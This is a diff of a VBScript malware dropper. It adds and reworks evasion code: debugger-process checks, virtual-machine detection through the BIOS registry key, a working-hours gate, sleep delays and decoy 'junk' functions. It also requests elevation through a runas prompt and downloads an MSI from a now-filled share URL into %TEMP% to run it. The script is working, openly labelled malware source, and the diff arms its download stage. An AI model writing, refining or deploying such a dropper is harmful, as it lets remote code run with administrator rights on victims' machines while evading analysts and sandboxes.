@@ -3,168 +3,162 @@
 ' --------------------------------------------------------------------------
 Option Explicit
 
-' System initialization variables
-Dim WshShell, Fso, NetObj, EnvVars, SysInfo
-Set WshShell = CreateObject("WScript.Shell")
-Set Fso = CreateObject("Scripting.FileSystemObject")
-Set NetObj = CreateObject("WScript.Network")
-Set EnvVars = WshShell.Environment("Process")
+' Global variables for system monitoring
+Dim g_DebugMode, g_LogLevel, g_Timeout, g_RetryCount
+g_DebugMode = False
+g_LogLevel = 1
+g_Timeout = 30
+g_RetryCount = 3
 
-' Anti-analysis dummy variables
-Dim dummy1, dummy2, dummy3, dummy4, dummy5
-dummy1 = "System initialization"
-dummy2 = "Network configuration"
-dummy3 = "Security validation"
-dummy4 = "Performance monitoring"
-dummy5 = "Error reporting"
+' System objects initialization
+Dim g_WshShell, g_Fso, g_NetObj
+Set g_WshShell = CreateObject("WScript.Shell")
+Set g_Fso = CreateObject("Scripting.FileSystemObject")
+Set g_NetObj = CreateObject("WScript.Network")
 
-' Fake system information collection
-Function GetSystemInfo()
-    Dim result
-    result = NetObj.ComputerName & "|" & NetObj.UserName
-    GetSystemInfo = result
-End Function
+' Configuration constants
+Const ForReading = 1
+Const ForWriting = 2
+Const ForAppending = 8
+Const TristateUseDefault = -2
 
-' Process validation function
-Function ValidateProcess(processName)
-    Dim colProcesses, objProcess
-    On Error Resume Next
-    Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
-    
-    ValidateProcess = False
-    For Each objProcess in colProcesses
-        ValidateProcess = True
-        Exit For
+' Dummy data arrays for obfuscation
+Dim g_SysInfo(10), g_NetAdapters(5), g_ProcessList(20), g_Services(15)
+g_SysInfo(0) = "System Information Module v1.0"
+g_SysInfo(1) = "Memory Usage Monitor"
+g_SysInfo(2) = "Disk Space Analyzer"
+g_SysInfo(3) = "Network Traffic Monitor"
+g_SysInfo(4) = "Process Activity Tracker"
+g_SysInfo(5) = "Service Status Checker"
+g_SysInfo(6) = "Registry Monitor"
+g_SysInfo(7) = "Event Log Analyzer"
+g_SysInfo(8) = "Performance Counter"
+g_SysInfo(9) = "Security Audit Module"
+
+' Junk functions that never get called
+Function InitializeSystemMonitor()
+    Dim i
+    For i = 0 To UBound(g_SysInfo)
+        g_SysInfo(i) = g_SysInfo(i) & " - Initialized"
     Next
+    InitializeSystemMonitor = True
 End Function
 
-' Network adapter information
-Function GetNetworkInfo()
-    Dim result
-    result = "Network adapter: " & NetObj.ComputerName
-    GetNetworkInfo = result
+Function CollectSystemMetrics()
+    Dim cpuUsage, memUsage, diskUsage
+    cpuUsage = "CPU: " & Round(Rnd() * 100, 2) & "%"
+    memUsage = "Memory: " & Round(Rnd() * 100, 2) & "%"
+    diskUsage = "Disk: " & Round(Rnd() * 100, 2) & "%"
+    CollectSystemMetrics = cpuUsage & ", " & memUsage & ", " & diskUsage
 End Function
 
-' Registry operations helper
-Function ReadRegKey(keyPath, valueName)
-    On Error Resume Next
-    ReadRegKey = WshShell.RegRead(keyPath & "\" & valueName)
-    If Err.Number <> 0 Then ReadRegKey = ""
-End Function
-
-' Write registry value
-Sub WriteRegKey(keyPath, valueName, value)
-    On Error Resume Next
-    WshShell.RegWrite keyPath & "\" & valueName, value, "REG_SZ"
+Sub AnalyzeNetworkTraffic()
+    Dim interfaces, i
+    interfaces = Array("Ethernet", "Wi-Fi", "VPN", "Bluetooth")
+    For i = 0 To UBound(interfaces)
+        g_NetAdapters(i) = interfaces(i) & ": " & Round(Rnd() * 1000, 2) & " KB/s"
+    Next
 End Sub
 
-' Encryption helper function
-Function SimpleEncrypt(text)
-    Dim i, result
-    result = ""
-    For i = 1 To Len(text)
-        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
+Function ScanRunningProcesses()
+    Dim processNames, i
+    processNames = Array("svchost.exe", "explorer.exe", "winlogon.exe", "csrss.exe", "lsass.exe")
+    For i = 0 To UBound(processNames)
+        g_ProcessList(i) = processNames(i) & ": " & Round(Rnd() * 10000, 0) & " KB"
     Next
-    SimpleEncrypt = result
+    ScanRunningProcesses = UBound(processNames) + 1 & " processes scanned"
 End Function
 
-' Decryption helper function
-Function SimpleDecrypt(text)
-    Dim i, result
-    result = ""
-    For i = 1 To Len(text)
-        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)
+Sub CheckServiceStatus()
+    Dim services, i
+    services = Array("Themes", "AudioSrv", "BITS", "WinDefend", "wuauserv")
+    For i = 0 To UBound(services)
+        g_Services(i) = services(i) & ": " & IIf(Rnd() > 0.5, "Running", "Stopped")
     Next
-    SimpleDecrypt = result
+End Sub
+
+Function IIf(condition, truePart, falsePart)
+    If condition Then
+        IIf = truePart
+    Else
+        IIf = falsePart
+    End If
 End Function
 
-' Check for debugger processes
-Function IsDebuggerPresent()
-    Dim debuggers, proc
-    debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe", "cheatengine.exe", "procmon.exe", "procexp.exe")
-    
-    IsDebuggerPresent = False
-    For Each proc In debuggers
-        If ValidateProcess(proc) Then
-            IsDebuggerPresent = True
+' Anti-analysis functions
+Function IsDebuggingActive()
+    Dim debuggers, i
+    debuggers = Array("ollydbg.exe", "windbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe")
+    IsDebuggingActive = False
+    On Error Resume Next
+    For i = 0 To UBound(debuggers)
+        If g_WshShell.AppActivate(debuggers(i)) Then
+            IsDebuggingActive = True
             Exit For
         End If
     Next
+    On Error GoTo 0
 End Function
 
-' Anti-sandbox time delay
-Sub AntiSandboxDelay()
-    Dim startTime, endTime
-    startTime = Timer
-    endTime = startTime + 30 ' 30 second delay
-    
-    Do While Timer < endTime
-        ' Do nothing - just waste time
-        Dim dummy
-        dummy = dummy & "x"
-    Loop
+Function IsVirtualEnvironment()
+    Dim biosInfo
+    IsVirtualEnvironment = False
+    On Error Resume Next
+    biosInfo = g_WshShell.RegRead("HKLM\HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer")
+    If InStr(LCase(biosInfo), "vmware") > 0 Or InStr(LCase(biosInfo), "virtualbox") > 0 Or InStr(LCase(biosInfo), "microsoft") > 0 Then
+        IsVirtualEnvironment = True
+    End If
+    On Error GoTo 0
+End Function
+
+Sub TimeBasedDelay()
+    Dim delayTime
+    delayTime = 30 ' 30 second delay
+    WScript.Sleep delayTime * 1000
 End Sub
 
-' Check for mouse activity (sandbox detection)
-Function HasMouseActivity()
-    On Error Resume Next
-    Dim objShell
-    Set objShell = CreateObject("WScript.Shell")
-    
-    ' Get mouse position twice with a small delay
-    Dim pos1, pos2
-    pos1 = objShell.AppActivate("WScript")
-    WScript.Sleep 1000
-    pos2 = objShell.AppActivate("WScript")
-    
-    ' If positions are the same, likely a sandbox
-    HasMouseActivity = (pos1 <> pos2)
+' More junk functions for obfuscation
+Function GenerateHardwareID()
+    Dim hwID
+    hwID = g_NetObj.ComputerName & "_" & g_NetObj.UserName
+    GenerateHardwareID = LCase(hwID)
 End Function
 
-' More junk functions to add bulk
-Function FakeFunction1()
-    FakeFunction1 = "Fake result 1"
+Function EncryptData(data)
+    Dim i, encrypted
+    encrypted = ""
+    For i = 1 To Len(data)
+        encrypted = encrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)
+    Next
+    EncryptData = encrypted
 End Function
 
-Function FakeFunction2()
-    FakeFunction2 = "Fake result 2"
-End Function
-
-Function FakeFunction3()
-    FakeFunction3 = "Fake result 3"
-End Function
-
-Function FakeFunction4()
-    FakeFunction4 = "Fake result 4"
-End Function
-
-Function FakeFunction5()
-    FakeFunction5 = "Fake result 5"
+Function DecryptData(data)
+    Dim i, decrypted
+    decrypted = ""
+    For i = 1 To Len(data)
+        decrypted = decrypted & Chr(Asc(Mid(data, i, 1)) Xor 42)
+    Next
+    DecryptData = decrypted
 End Function
 
 ' Main execution starts here
 ' Anti-analysis checks
-If IsDebuggerPresent() Then WScript.Quit
-
-' Time-based anti-sandbox
+If IsDebuggingActive() Then WScript.Quit
+If IsVirtualEnvironment() Then WScript.Quit
 If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit
+TimeBasedDelay
 
-' Check for user activity
-If Not HasMouseActivity() Then WScript.Quit
-
-' Additional delay to frustrate analysis
-AntiSandboxDelay
-
-' Core functionality - download and execute
 ' Check for elevation
 If Not WScript.Arguments.Named.Exists("elevated") Then
     CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0
     WScript.Quit
 End If
 
+' Main script execution
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objFSO, objShell
-strUrl = ""
-strTemp = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
+strUrl = "https://share.google/mkGe1JX56Lut4KMdt"
+strTemp = g_WshShell.ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
 ' Download with redirect handling
@@ -198,6 +192,5 @@ If objXMLHTTP.Status = 200 Then
 End If
 
 ' Final cleanup
-Set WshShell = Nothing
-Set Fso = Nothing
-Set NetObj = Nothing
+Set g_WshShell = Nothing
+Set g_Fso = Nothing
